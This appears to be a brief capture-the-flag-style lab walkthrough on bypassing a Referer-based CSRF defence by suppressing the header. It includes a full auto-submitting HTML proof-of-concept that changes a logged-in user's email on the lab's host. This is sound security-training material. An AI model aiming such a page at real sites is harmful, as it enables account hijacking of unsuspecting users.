# Lab: CSRF where Referer validation depends on header being present

Intercept a request to change the email address and notice that if the referer is changed, it is rejected, but if it is removed, it is accepted.

Use the following exploit to supress the referer header:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <meta name="referrer" content="no-referrer">
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac551f381e6224eac0eb722c00fa0050.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asdf&#64;asdf&#46;com" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>
```